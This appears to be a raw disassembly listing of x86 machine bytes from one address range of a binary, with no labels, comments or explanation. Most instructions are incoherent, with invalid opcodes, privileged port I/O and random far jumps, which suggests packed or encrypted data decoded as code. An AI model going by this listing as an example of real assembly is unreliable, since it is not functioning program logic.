  40ecf6:	push   es
  40ecf7:	fidivr DWORD PTR [eax+0xb]
  40ecfa:	inc    esi
  40ecfb:	push   0x2638e060
  40ed00:	mov    dh,BYTE PTR [edx]
  40ed02:	outs   dx,BYTE PTR ds:[esi]
  40ed03:	xor    BYTE PTR [edi+0x5f],ch
  40ed06:	mov    esi,0x5da62839
  40ed0b:	sbb    BYTE PTR [edx+0x4ed59ad3],ah
  40ed11:	jl     0x40ec98
  40ed13:	retf   0xf9a1
  40ed16:	jae    0x40ed18
  40ed18:	mov    dl,0xd2
  40ed1a:	loope  0x40ed01
  40ed1c:	adc    al,0x4c
  40ed1e:	sub    cl,BYTE PTR [ebx]
  40ed20:	test   BYTE PTR [esp+ebp*2],ch
  40ed23:	das    
  40ed24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed25:	and    al,0x55
  40ed27:	pop    eax
  40ed28:	call   FWORD PTR [edi-0x4a45ec44]
  40ed2e:	push   ds
  40ed2f:	sbb    BYTE PTR cs:[esi],al
  40ed32:	imul   ebp,DWORD PTR ss:0x829446e,0x47
  40ed3a:	aam    0xb2
  40ed3c:	lea    ebx,[ebx-0x75fac557]
  40ed42:	mov    eax,ds:0x96f8783a
  40ed47:	hlt    
  40ed48:	fcmove st,st(1)
  40ed4a:	inc    esp
  40ed4b:	pusha  
  40ed4c:	pop    ds
  40ed4d:	add    dh,dl
  40ed4f:	aaa    
  40ed50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed51:	loopne 0x40ed38
  40ed53:	xchg   esp,eax
  40ed54:	scas   al,BYTE PTR es:[edi]
  40ed55:	cmp    ah,dh
  40ed57:	(bad)  
  40ed59:	add    edx,ebp
  40ed5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed5c:	or     cl,dl
  40ed5e:	imul   edx,DWORD PTR [ecx],0x14
  40ed61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed62:	lea    eax,[esi-0x77]
  40ed65:	lods   eax,DWORD PTR ds:[esi]
  40ed66:	xor    ecx,ebx
  40ed68:	push   edi
  40ed69:	inc    edi
  40ed6a:	test   DWORD PTR [esi-0x102638be],eax
  40ed70:	cmp    edi,DWORD PTR [edi+0x4805e67]
  40ed76:	mov    bh,0x6e
  40ed78:	jmp    0x40ed4d
  40ed7a:	mov    eax,0xe79bbdf5
  40ed7f:	push   0xfffffff7
  40ed81:	stos   BYTE PTR es:[edi],al
  40ed82:	xchg   ecx,eax
  40ed83:	sbb    al,BYTE PTR fs:[ebx-0x4466db96]
  40ed8a:	sub    edx,DWORD PTR [eax+0x5a9e71ec]
  40ed90:	push   esp
  40ed91:	lahf   
  40ed92:	aas    
  40ed93:	inc    esi
  40ed94:	inc    edi
  40ed95:	mov    esp,DWORD PTR [ebx]
  40ed97:	(bad)  
  40ed99:	mov    cl,0xdc
  40ed9b:	fstp   TBYTE PTR [ebx]
  40ed9d:	pop    esp
  40ed9e:	mov    ebx,0xf04a3437
  40eda3:	cld    
  40eda4:	mov    ebp,0x8978beea
  40eda9:	mov    esi,0xec8203ab
  40edae:	pop    esp
  40edaf:	xor    eax,0xc272f85d
  40edb4:	jg     0x40ee12
  40edb6:	inc    esi
  40edb7:	mov    cl,0x4f
  40edb9:	mov    dh,0x67
  40edbb:	xchg   edx,eax
  40edbc:	push   0xffffffd0
  40edbe:	cdq    
  40edbf:	xor    edi,DWORD PTR [eax+0x3be74cc0]
  40edc5:	dec    ebx
  40edc6:	mov    esp,0x2395e10b
  40edcb:	mov    cl,0x4e
  40edcd:	lds    esi,FWORD PTR [edx]
  40edcf:	(bad)  
  40edd0:	into   
  40edd1:	sub    esi,ebp
  40edd3:	mov    dl,0xe7
  40edd5:	adc    DWORD PTR [eax],ebx
  40edd7:	adc    al,0xae
  40edd9:	add    esp,edx
  40eddb:	fwait
  40eddc:	xor    eax,0xb42d783
  40ede1:	push   edi
  40ede2:	adc    al,0xd8
  40ede4:	retf   
  40ede5:	fsubr  QWORD PTR [ebp+edx*1-0x4da35431]
  40edec:	pop    ebx
  40eded:	(bad)  
  40edee:	rol    ebx,1
  40edf0:	(bad)  [ecx]
  40edf2:	pushf  
  40edf3:	mov    DWORD PTR [ecx+edx*2+0x3b93e858],esi
  40edfa:	xor    bl,dl
  40edfc:	add    al,0x1c
  40edfe:	adc    BYTE PTR [ebx],bh
  40ee00:	std    
  40ee01:	mov    ebp,0xab7c4b98
  40ee06:	adc    ebp,DWORD PTR [ebp+0x5e]
  40ee09:	jge    0x40ee81
  40ee0b:	(bad)  [ebx+0x7df58440]
  40ee11:	cmp    DWORD PTR [esi],esp
  40ee13:	fucom  st(5)
  40ee15:	mov    BYTE PTR ds:0x4a6939b1,ah
  40ee1b:	loope  0x40ee87
  40ee1d:	out    dx,eax
  40ee1e:	dec    esp
  40ee1f:	aas    
  40ee20:	in     eax,dx
  40ee21:	or     eax,0x911947e7
  40ee26:	js     0x40ede7
  40ee28:	xchg   esi,eax
  40ee29:	sbb    esi,DWORD PTR [eax]
  40ee2b:	mov    ds:0x6af1c32b,eax
  40ee30:	jo     0x40edfa
  40ee32:	rcl    DWORD PTR [edx-0x6a],cl
  40ee35:	fs mov bh,0xcc
  40ee38:	(bad)
  40ee3b:	xor    dl,BYTE PTR [edx-0x74]
  40ee3e:	fs stc 
  40ee40:	jo     0x40eded
  40ee42:	xor    ah,BYTE PTR [ecx-0x24afb54f]
  40ee48:	ins    BYTE PTR es:[edi],dx
  40ee49:	js     0x40eebf
  40ee4b:	jmp    0x7305:0x81ff13d2
  40ee52:	cs push ds
  40ee54:	loopne 0x40edde
  40ee56:	out    dx,al
  40ee57:	jb     0x40ee32
  40ee59:	pushf  
  40ee5a:	test   al,0xe8
  40ee5c:	xchg   esp,eax
  40ee5d:	jbe    0x40ee63
  40ee5f:	stos   DWORD PTR es:[edi],eax
  40ee60:	cs dec edx
  40ee62:	add    eax,0xd7789f11
  40ee67:	cdq    
  40ee68:	imul   esi,DWORD PTR [ebx-0x6a],0x16
  40ee6c:	dec    ebx
  40ee6d:	shl    eax,1
  40ee6f:	jg     0x40ee72
  40ee71:	retf   
  40ee72:	shr    DWORD PTR [eax],cl
  40ee74:	out    0xbf,eax
  40ee76:	sub    al,BYTE PTR [ecx+ebx*1]
  40ee79:	scas   al,BYTE PTR es:[edi]
  40ee7a:	and    ch,BYTE PTR [eax]
  40ee7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee7d:	lds    ebx,FWORD PTR [edx-0x79d3f9c7]
  40ee83:	out    dx,al
  40ee84:	mov    ecx,0x5df44873
  40ee89:	jg     0x40eed3
  40ee8b:	or     DWORD PTR [eax+0x44],ecx
  40ee8e:	jge    0x40ef0e
  40ee90:	xor    al,0x7
  40ee92:	and    eax,0x2c5bb320
  40ee97:	outs   dx,DWORD PTR ds:[esi]
  40ee98:	push   0x5dbf5c75
  40ee9d:	in     eax,dx
  40ee9e:	pop    ds
  40ee9f:	jae    0x40ee4e
  40eea1:	ja     0x40ee9a
  40eea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eea4:	bound  eax,QWORD PTR [ecx+0x1f]
  40eea7:	or     al,0x6c
  40eea9:	xor    eax,0x39ba9ff0
  40eeae:	int3   
  40eeaf:	fsub   DWORD PTR [ebp+eiz*2-0x40]
  40eeb3:	mov    BYTE PTR [ecx],0xf4
  40eeb6:	push   edx
  40eeb7:	loopne 0x40eebb
  40eeb9:	pop    es
  40eeba:	fldcw  WORD PTR [edi+0x37bf7c1d]
  40eec0:	sub    BYTE PTR [eax+0x21578f45],ah
  40eec6:	or     ebp,DWORD PTR [ebx+0x225833d5]
  40eecc:	sbb    eax,0xdfdb35d0
  40eed1:	and    esp,DWORD PTR [esi-0x34]
  40eed4:	cdq    
  40eed5:	xor    BYTE PTR [edx+ebx*1+0x20],bh
  40eed9:	sub    DWORD PTR [ecx-0x65ff8595],esi
  40eedf:	or     cl,ah
  40eee1:	sub    al,0x82
  40eee3:	test   eax,0x2360c7a9
  40eee8:	js     0x40ee9c
  40eeea:	ss aam 0xba
  40eeed:	ins    DWORD PTR es:[edi],dx
  40eeee:	pop    edi
  40eeef:	dec    ecx
  40eef0:	(bad)  
  40eef1:	(bad)  
  40eef2:	push   ss
  40eef3:	push   eax
  40eef4:	sti    
  40eef5:	push   esp
  40eef6:	pop    es
  40eef7:	enter  0x8570,0xe2
  40eefb:	xchg   esi,eax
  40eefc:	cld    
  40eefd:	cmpxchg dh,ch
  40ef00:	mov    dh,0x91
  40ef02:	push   edx
  40ef03:	pop    ss
  40ef04:	jmp    0x833f:0x2db20900
  40ef0b:	xor    BYTE PTR [ebx+0x4f],ch
  40ef0e:	fisttp DWORD PTR [ebp+eiz*8-0x5]
  40ef12:	jg     0x40ef46
  40ef14:	out    0x99,eax
  40ef16:	xchg   edx,eax
  40ef17:	cs js  0x40eed9
  40ef1a:	cmp    DWORD PTR [eax],ebp
  40ef1c:	sbb    al,0x49
  40ef1e:	adc    esp,DWORD PTR [ecx+0x5f]
  40ef21:	adc    ah,BYTE PTR [eax-0x7cf4e5f0]
  40ef27:	test   DWORD PTR [ebp+0x6ba434f3],0x44a2e897
  40ef31:	sbb    al,0x3d
  40ef33:	mov    eax,0xcb333930
  40ef38:	fidiv  WORD PTR [ecx]
  40ef3a:	jns    0x40ef1c
  40ef3c:	lods   eax,DWORD PTR ds:[esi]
  40ef3d:	fsub   st,st(0)
  40ef3f:	sub    eax,0x366eae82
  40ef44:	fidiv  WORD PTR [ebp-0x55]
  40ef47:	xchg   edi,eax
  40ef48:	and    esi,edi
  40ef4a:	fs in  al,dx
  40ef4c:	xchg   ebp,eax
  40ef4d:	fwait
  40ef4e:	and    eax,DWORD PTR [esi-0x6e]
  40ef51:	lods   eax,DWORD PTR ds:[esi]
  40ef52:	icebp  
  40ef53:	xchg   ecx,eax
  40ef54:	pushf  
  40ef55:	jb     0x40eed8
  40ef57:	stc    
  40ef58:	jb     0x40ef80
  40ef5a:	fisttp WORD PTR [esi-0x45]
  40ef5d:	xchg   BYTE PTR [ebx-0x1a44e68b],cl
  40ef63:	retf   
  40ef64:	shr    BYTE PTR [esi-0x5b],cl
  40ef67:	loopne 0x40ef0f
  40ef69:	dec    ebp
  40ef6a:	out    0x9e,eax
  40ef6c:	jge    0x40ef08
  40ef6e:	retf   0xe5eb
  40ef71:	jecxz  0x40efa4
  40ef73:	pop    esp
  40ef74:	mov    dh,0x1c
  40ef76:	mov    dl,0x4a
  40ef78:	outs   dx,DWORD PTR ds:[esi]
  40ef79:	jns    0x40ef71
  40ef7b:	mov    ah,0x85
  40ef7d:	dec    esi
  40ef7e:	call   0x7dbe:0xae77
  40ef84:	add    edi,DWORD PTR [edx+0x3c1b9ede]
  40ef8a:	aad    0xfd
  40ef8c:	test   al,0x96
  40ef8e:	pushf  
  40ef8f:	test   eax,0xcff8f5b5
  40ef94:	sub    esp,DWORD PTR [esi]
  40ef96:	dec    ecx
  40ef97:	ja     0x40f006
  40ef99:	and    ah,BYTE PTR [ebx+0x59]
  40ef9c:	cmp    DWORD PTR [ebx+0x6fe0a160],edi
  40efa2:	pop    esp
  40efa3:	jb     0x40efe7
  40efa5:	mov    ebx,0x2b95fce2
  40efaa:	test   al,0xa7
  40efac:	das    
  40efad:	pop    edi
  40efae:	aas    
  40efaf:	add    ch,BYTE PTR [eax+eax*2]
  40efb2:	pushf  
  40efb3:	int    0xa1
  40efb5:	xor    al,0x9b
  40efb7:	push   0x3a
  40efb9:	fmul   DWORD PTR [esi+0x53aec7fa]
  40efbf:	test   DWORD PTR [edi+0x77dbe169],ecx
  40efc5:	add    al,ah
  40efc7:	mov    DWORD PTR [edx-0x28aa5d56],edx
  40efcd:	lods   al,BYTE PTR ds:[esi]
  40efce:	retf   0x595b
  40efd1:	call   0xdb5e:0x27ab8571
  40efd8:	push   ebx
  40efd9:	cdq    
  40efda:	popf   
  40efdb:	cmp    DWORD PTR [eax-0x19074207],ebx
  40efe1:	popa   
  40efe2:	lods   al,BYTE PTR ds:[esi]
  40efe3:	xor    DWORD PTR [eax+0x3d],esp
  40efe6:	mov    ah,0x25
  40efe8:	pop    edi
  40efe9:	jg     0x40f04d
  40efeb:	mov    bl,0x28
  40efed:	es jno 0x40efc7
  40eff0:	call   0x30c8:0x4e1eebd1
  40eff7:	push   cs
  40eff8:	outs   dx,BYTE PTR ds:[esi]
  40eff9:	adc    ecx,ebp
  40effb:	jecxz  0x40f001
  40effd:	(bad)  
  40effe:	mov    ebp,0xf91a060c
  40f003:	jp     0x40f05c
  40f005:	jge    0x40f036
  40f007:	adc    eax,0x6fb8ebf7
  40f00c:	mov    ds:0xa89a20d1,eax
  40f011:	jmp    0x40f07a
  40f013:	jae    0x40f091
  40f015:	or     ch,BYTE PTR [edx+0x1f]
  40f018:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f019:	into   
  40f01a:	xor    edi,eax
  40f01c:	add    al,0x5a
  40f01e:	xchg   esp,eax
  40f01f:	adc    dh,BYTE PTR ss:[ecx+0x1d]
  40f023:	or     BYTE PTR [eax],bl
  40f025:	or     bl,ah
  40f027:	jnp    0x40efeb
  40f029:	lods   al,BYTE PTR ds:[esi]
  40f02a:	adc    ah,ah
  40f02c:	mov    cl,dl
  40f02e:	or     ecx,DWORD PTR [edx+0x5e23b475]
  40f034:	mov    bh,0xb8
  40f036:	pop    edx
  40f037:	sub    esp,DWORD PTR cs:[ebx+ebp*8]
  40f03b:	or     eax,0xb5146042
  40f040:	jno    0x40f04f
  40f042:	lods   eax,DWORD PTR ds:[esi]
  40f043:	xor    eax,0xff0e842f
  40f048:	jge    0x40f012
  40f04a:	fwait
  40f04b:	xchg   ebp,eax
  40f04c:	rcr    dl,1
  40f04e:	aaa    
  40f04f:	(bad)  
  40f050:	sbb    eax,0x874b061
  40f055:	mov    al,0xaf
  40f057:	xchg   ebp,eax
  40f058:	mov    dl,0x24
  40f05a:	ffreep st(4)
  40f05c:	out    dx,eax
  40f05d:	stos   DWORD PTR es:[edi],eax
  40f05e:	in     eax,dx
  40f05f:	aad    0xea
  40f061:	outs   dx,DWORD PTR ds:[esi]
  40f062:	(bad)  
  40f063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f064:	aaa    
  40f065:	sti    
  40f066:	out    dx,eax
  40f067:	fsubr  QWORD PTR [esi+esi*4+0x26d5f343]
  40f06e:	xor    al,0xa1
  40f070:	mov    ebp,0x31cf4761
  40f075:	mov    ds:0x763f8cb4,eax
  40f07a:	xor    cl,dl
  40f07c:	and    esi,0x4d30f1c1
  40f082:	ins    DWORD PTR es:[edi],dx
  40f083:	stos   BYTE PTR es:[edi],al
  40f084:	dec    edx
  40f085:	pop    ds
  40f086:	ss and eax,0x54ae7492
  40f08c:	xor    DWORD PTR [edi],esp
  40f08e:	jl     0x40f0c0
  40f090:	dec    eax
  40f091:	xor    eax,0x8b3384aa
  40f096:	call   0x4eaf2293
  40f09b:	cwde   
  40f09c:	loop   0x40f054
  40f09e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f09f:	out    dx,eax
  40f0a0:	jae    0x40f06e
  40f0a2:	(bad)  
  40f0a3:	sub    al,0x5f
  40f0a5:	in     eax,dx
  40f0a6:	repz push 0xffffffd5
  40f0a9:	jne    0x40f0e9
  40f0ab:	cmc    
  40f0ac:	push   ebx
  40f0ad:	fistp  DWORD PTR [eax]
  40f0af:	inc    eax
  40f0b0:	xchg   esi,eax
  40f0b1:	push   ds
  40f0b2:	xor    BYTE PTR [eax+0x1f5aab26],0x80
  40f0b9:	retfw  0x3249
  40f0bd:	int3   
  40f0be:	les    edx,FWORD PTR [ebx+0x2f9a08bd]
  40f0c4:	mov    ah,0xfc
  40f0c6:	push   0x22
  40f0c8:	jecxz  0x40f098
  40f0ca:	sar    DWORD PTR [eax],cl
  40f0cc:	je     0x40f123
  40f0ce:	cli    
  40f0cf:	jne    0x40f09a
  40f0d1:	inc    edx
  40f0d2:	xchg   ebx,eax
  40f0d3:	mov    ah,0xd4
  40f0d5:	gs or  esp,eax
  40f0d8:	inc    edi
  40f0d9:	sub    BYTE PTR [eax-0x29],cl
  40f0dc:	jnp    0x40f06e
  40f0de:	scas   al,BYTE PTR es:[edi]
  40f0df:	xor    DWORD PTR [eax],ebp
  40f0e1:	or     eax,0xda9e442e
  40f0e6:	pop    esp
  40f0e7:	lahf   
  40f0e8:	test   DWORD PTR [esi],esp
  40f0ea:	xchg   ebp,eax
  40f0eb:	inc    ecx
  40f0ec:	loopne 0x40f0ac
  40f0ee:	mov    ebx,0xa665d96
  40f0f3:	inc    ecx
  40f0f4:	call   0x7400d319
  40f0f9:	and    DWORD PTR [ecx+0x660c5239],0xefa3b5b8
  40f103:	test   eax,0xc491ed16
  40f108:	ins    BYTE PTR es:[edi],dx
  40f109:	push   ecx
  40f10a:	pop    eax
  40f10b:	push   0x3f
  40f10d:	mov    ah,0x53
  40f10f:	adc    eax,0xeeb2235f
  40f114:	int    0x3c
  40f116:	lea    edx,[eax+0x5e]
  40f119:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f11a:	xchg   esi,eax
  40f11b:	mov    es,WORD PTR fs:[edi-0xa]
  40f11f:	cmp    BYTE PTR [eax+0x39],bl
  40f122:	ins    BYTE PTR es:[edi],dx
  40f123:	sbb    BYTE PTR [edx],0x83
  40f126:	xlat   BYTE PTR ds:[ebx]
  40f127:	and    eax,0x1e21495a
  40f12c:	test   BYTE PTR [ebx-0x1c91efbb],dh
  40f132:	dec    eax
  40f133:	inc    esp
  40f134:	mov    ds:0xfc0b1f9b,eax
  40f139:	test   al,0x7f
  40f13b:	ss std 
  40f13d:	inc    ebp
  40f13e:	test   eax,0xc8b4a97a
  40f143:	enterw 0x5887,0xea
  40f148:	rcl    DWORD PTR [eax+ebp*8-0x4a1137aa],cl
  40f14f:	shl    DWORD PTR [esi],cl
  40f151:	in     al,0xbe
  40f153:	xor    sp,WORD PTR [edi]
  40f156:	rdpkru 
  40f159:	fbstp  TBYTE PTR [ecx+0x18f8b72f]
  40f15f:	adc    ecx,DWORD PTR [ebp-0x7cc52e60]
  40f165:	int    0x9
  40f167:	push   0x52e0947e
  40f16c:	repz mov ecx,DWORD PTR [ecx-0x76becd75]
  40f173:	sub    DWORD PTR [ecx-0x5ec63ad9],0x6a
  40f17a:	adc    ecx,ebp
  40f17c:	aaa    
  40f17d:	fdiv   st,st(3)
  40f17f:	xor    DWORD PTR ds:0xf8dd0b72,ecx
  40f185:	and    BYTE PTR [edx+0x2e6b3e0d],0x28
  40f18c:	pop    es
  40f18d:	sub    dh,BYTE PTR [ebx+0x5e]
  40f190:	in     eax,0xc
  40f192:	mov    al,ds:0xc25ab16f
  40f197:	xchg   esp,eax
  40f198:	mul    BYTE PTR [esi-0x34085076]
  40f19e:	xchg   DWORD PTR [ebx],esp
  40f1a0:	(bad)  
  40f1a1:	sbb    dl,dl
  40f1a3:	xchg   esi,eax
  40f1a4:	fcmovb st,st(5)
  40f1a6:	dec    edx
  40f1a7:	push   cs
  40f1a8:	jbe    0x40f218
  40f1aa:	mov    ds:0xa601dc59,eax
  40f1af:	or     eax,0x613e019a
  40f1b4:	lds    ebp,FWORD PTR ss:[edx]
  40f1b7:	cli    
  40f1b8:	test   esp,0xd7f03d4a
  40f1be:	sub    eax,0xaf2a64f0
  40f1c3:	push   esi
  40f1c4:	(bad)
  40f1c7:	xchg   esp,eax
  40f1c8:	dec    edi
  40f1c9:	jbe    0x40f1be
  40f1cb:	dec    esp
  40f1cc:	jle    0x40f22b
  40f1ce:	lea    eax,[ebx-0x28e76ff1]
  40f1d4:	push   eax
  40f1d5:	push   ss
  40f1d6:	jmp    0x119cd94e
  40f1db:	out    0xdc,al
  40f1dd:	cmp    ch,0x57
  40f1e0:	add    eax,ebp
  40f1e2:	(bad)  
  40f1e3:	call   0x2e37a784
  40f1e8:	or     esi,ebx
  40f1ea:	inc    ebx
  40f1eb:	mov    ecx,0xa4540bbc
  40f1f0:	repz sub BYTE PTR ds:[esi],dh
  40f1f4:	xor    DWORD PTR [ebx+0x6a],ebx
  40f1f7:	jle    0x40f20f
  40f1f9:	sar    BYTE PTR [ecx-0x3d22ef63],cl
  40f1ff:	pop    eax
  40f200:	pop    ds
  40f201:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f202:	sbb    esp,DWORD PTR [ecx]
  40f204:	xchg   ecx,eax
  40f205:	add    ch,BYTE PTR [ebx+0x20]
  40f208:	test   al,0xb7
  40f20a:	xchg   edi,eax
  40f20b:	add    BYTE PTR [ecx],al
  40f20d:	fisttp WORD PTR [ecx-0x6a]
  40f210:	les    esp,FWORD PTR [eax]
  40f212:	lods   eax,DWORD PTR ds:[esi]
  40f213:	inc    BYTE PTR [ebx+0x1152f4ba]
  40f219:	shl    DWORD PTR [edx+0x405979ff],0x1
  40f220:	or     esi,ebp
  40f222:	bound  edi,QWORD PTR [edi+eax*8+0x5886df73]
  40f229:	stos   DWORD PTR es:[edi],eax
  40f22a:	shl    BYTE PTR [ecx],cl
  40f22c:	fwait
  40f22d:	cmp    DWORD PTR [eax],0x34
  40f230:	shl    BYTE PTR [ebx-0x5a],cl
  40f233:	cmp    dl,BYTE PTR [eax-0x7f]
  40f236:	std    
  40f237:	aas    
  40f238:	stc    
  40f239:	inc    ebx
  40f23a:	add    ecx,ebx
  40f23c:	test   ecx,edi
  40f23e:	xor    al,0x4f
  40f240:	mov    edi,0xc40a4be6
  40f245:	or     BYTE PTR [ebx-0x4cdd78b8],al
  40f24b:	les    esi,FWORD PTR [esi+eax*4+0x2026c161]
  40f252:	xor    dh,ah
  40f254:	push   cs
  40f255:	push   0x6e654b27
  40f25a:	inc    edi
  40f25b:	or     DWORD PTR [ebx-0x12],esp
  40f25e:	pusha  
  40f25f:	or     BYTE PTR [ecx-0x78b769ed],cl
  40f265:	jbe    0x40f2bb
  40f267:	xchg   BYTE PTR ds:0x4a1bcdcc,bl
  40f26d:	mov    ecx,0xb73fbb16
  40f272:	and    ebp,eax
  40f274:	das    
  40f275:	pop    esp
  40f276:	leave  
  40f277:	ret    0xd0e5
  40f27a:	sbb    dh,BYTE PTR [edx-0x27]
  40f27d:	sbb    al,0x11
  40f27f:	inc    ecx
  40f280:	popa   
  40f281:	or     eax,0x49caf2
  40f286:	test   DWORD PTR [edx-0x66],esi
  40f289:	repnz push edi
  40f28b:	mov    BYTE PTR [esi],bh
  40f28d:	mov    DWORD PTR [edi+0x4d],esi
  40f290:	pop    esp
  40f291:	jl     0x40f223
  40f293:	xchg   esi,eax
  40f294:	and    BYTE PTR [ecx+edx*2+0x3b51c93c],0xd6
  40f29c:	pop    ds
  40f29d:	loop   0x40f250
  40f29f:	lds    eax,FWORD PTR [ecx]
  40f2a1:	jmp    0x2e04ae43
  40f2a6:	xor    eax,DWORD PTR [ebp-0x20a14238]
  40f2ac:	dec    eax
  40f2ad:	hlt    
  40f2ae:	pop    ss
  40f2af:	cli    
  40f2b0:	icebp  
  40f2b1:	mov    dh,bl
  40f2b3:	dec    ebx
  40f2b4:	or     eax,0x126e8271
  40f2b9:	sahf   
  40f2ba:	sbb    bh,dl
  40f2bc:	jb     0x40f2a8
  40f2be:	in     eax,dx
  40f2bf:	ret    0x5319
  40f2c2:	loop   0x40f28f
  40f2c4:	adc    eax,0xa250716a
  40f2c9:	mov    bh,0x6a
  40f2cb:	arpl   WORD PTR [edi-0x15cb00f9],cx
  40f2d1:	cmp    BYTE PTR [ebp-0x7fe1d302],0x4
  40f2d8:	imul   edi,DWORD PTR [edx+0x5bcd43f8],0xffffffd7
  40f2df:	iret   
  40f2e0:	inc    esi
  40f2e1:	rol    cl,1
  40f2e3:	mov    ebp,edx
  40f2e5:	daa    
  40f2e6:	fld    TBYTE PTR [ebx]
  40f2e8:	and    DWORD PTR [ebx-0x81f6917],0xffffff8a
  40f2ef:	pop    ebp
  40f2f0:	arpl   WORD PTR [edi+0x9],ax
  40f2f3:	(bad)  
  40f2f4:	mov    edi,0xee795e67
  40f2f9:	add    DWORD PTR [ebp-0xdcb3baf],0xaa1aaad0
  40f303:	mov    bl,0x66
  40f305:	inc    ecx
  40f306:	jmp    0x40f2a6
  40f308:	jl     0x40f35e
  40f30a:	popf   
  40f30b:	mov    esp,0x1e9bf381
  40f310:	scas   eax,DWORD PTR es:[edi]
  40f311:	idiv   DWORD PTR [eax]
  40f313:	mov    eax,0x7fcedd1b
  40f318:	and    eax,0x847463ad
  40f31d:	sbb    BYTE PTR [ecx-0x28c5936f],ah
  40f323:	neg    DWORD PTR [ebx+0x27]
  40f326:	aaa    
  40f327:	in     eax,dx
  40f328:	mov    edx,0xeb48741
  40f32d:	jo     0x40f30d
  40f32f:	mov    dh,0x97
  40f331:	and    BYTE PTR [edx+0x5df97b44],0x8d
  40f338:	and    esp,ecx
  40f33a:	stos   BYTE PTR es:[edi],al
  40f33b:	xor    al,0x15
  40f33d:	lock mov edi,0xcd832451
  40f343:	aad    0xc2
  40f345:	int3   
  40f346:	sbb    eax,0x1e23f1e
  40f34b:	adc    edx,DWORD PTR [edx-0x1a]
  40f34e:	mov    al,0x8
  40f350:	loop   0x40f302
  40f352:	loop   0x40f2e4
  40f354:	or     eax,0xe78b63d1
  40f359:	mov    eax,0xb3e92c62
  40f35e:	mov    dh,0x54
  40f360:	sar    esi,cl
  40f362:	das    
  40f363:	ins    BYTE PTR es:[edi],dx
  40f364:	and    BYTE PTR [eax+0x4384bdff],dh
  40f36a:	cmp    eax,0xef6c60f3
  40f36f:	dec    eax
  40f370:	fucomi st,st(5)
  40f372:	ss jnp 0x40f3d5
  40f375:	dec    esi
  40f376:	sti    
  40f377:	ins    DWORD PTR es:[edi],dx
  40f378:	cmp    DWORD PTR [eax-0x4389211],ecx
  40f37e:	mov    esp,0x1659016
  40f383:	or     DWORD PTR [ebx],esp
  40f385:	out    0xda,eax
  40f387:	and    BYTE PTR [esi],0x6b
  40f38a:	idiv   BYTE PTR [edi+0x72886681]
  40f390:	sub    esp,DWORD PTR [eax-0x2f]
  40f393:	loope  0x40f33a
  40f395:	imul   ebx,DWORD PTR [eax+0x4d86c2fb],0xffffff82
  40f39c:	cmp    bh,BYTE PTR [esi]
  40f39e:	popa   
  40f39f:	xor    ebx,edx
  40f3a1:	xchg   ebx,eax
  40f3a2:	aam    0x68
  40f3a4:	sbb    ch,BYTE PTR [ecx-0x2]
  40f3a7:	leave  
  40f3a8:	fwait
  40f3a9:	clc    
  40f3aa:	mov    ah,0x3e
  40f3ac:	xor    eax,0x4949e127
  40f3b1:	mov    esi,0x727098cb
  40f3b6:	jle    0x40f3fe
  40f3b8:	sti    
  40f3b9:	mov    cl,0xe3
  40f3bb:	cmp    eax,edx
  40f3bd:	fs dec ebp
  40f3bf:	nop
  40f3c0:	ja     0x40f3e1
  40f3c2:	das    
  40f3c3:	xor    ch,BYTE PTR ds:[ebx+eax*4+0x7f]
  40f3c8:	popa   
  40f3c9:	fmulp  st(2),st
  40f3cb:	iret   
  40f3cc:	dec    DWORD PTR [ebp+0x18]
  40f3cf:	dec    esp
  40f3d0:	and    BYTE PTR [edx-0x760d3b67],bl
  40f3d6:	es inc esp
  40f3d8:	scas   al,BYTE PTR es:[edi]
  40f3d9:	or     BYTE PTR [ebx],ah
  40f3db:	ror    DWORD PTR [edi+0x1a],1
  40f3de:	fidivr DWORD PTR [ebx+0x37726e69]
  40f3e4:	out    0x17,al
  40f3e6:	jge    0x40f3ed
  40f3e8:	mov    eax,ds:0xe5b4ad72
  40f3ed:	in     eax,dx
  40f3ee:	rcl    edi,cl
  40f3f0:	mov    cl,0x8c
  40f3f2:	das    
  40f3f3:	int    0x33
  40f3f5:	fistp  WORD PTR [esi-0x6a]
  40f3f8:	cmp    al,0x35
  40f3fa:	mov    bh,0x38
  40f3fc:	jp     0x40f381
  40f3fe:	sub    DWORD PTR [edx-0x7f45856],edi
  40f404:	gs jo  0x40f44d
  40f407:	fwait
  40f408:	sub    DWORD PTR [edi-0x4e4af325],0xb840b7a8
  40f412:	ja     0x40f415
  40f414:	sahf   
  40f415:	fisttp DWORD PTR [eax]
  40f417:	mov    edx,?
  40f419:	mov    edx,0x6bdf8569
  40f41e:	inc    dh
  40f420:	retf   0x1790
  40f423:	dec    ecx
  40f424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f425:	aas    
  40f426:	or     BYTE PTR ds:0xd9b931ac,bl
  40f42c:	xor    cl,dl
  40f42e:	inc    ecx
  40f42f:	adc    BYTE PTR [ebx-0x2b],bh
  40f432:	adc    al,bh
  40f434:	and    esi,DWORD PTR [bp+si]
  40f437:	nop
  40f438:	mul    BYTE PTR [ecx-0x10520b92]
  40f43e:	or     al,0x13
  40f440:	repnz push eax
  40f442:	add    BYTE PTR [edi+0x5d],0x32
  40f446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f447:	fwait
  40f448:	dec    ebx
  40f449:	and    BYTE PTR [ebp-0x4733bd12],dl
  40f44f:	add    ecx,eax
  40f451:	les    eax,FWORD PTR ds:0xca2302ca
  40f457:	jnp    0x40f419
  40f459:	jge    0x40f470
  40f45b:	mul    BYTE PTR [ebx]
  40f45d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f45e:	in     eax,dx
  40f45f:	mov    al,ds:0x657e0e55
  40f464:	dec    ebx
  40f465:	jne    0x40f4ac
  40f467:	and    esi,DWORD PTR [ebp-0x5fed8f2c]
  40f46d:	stos   DWORD PTR es:[edi],eax
  40f46e:	push   0x4e
  40f470:	and    ecx,DWORD PTR [ecx-0x15]
  40f473:	cmc    
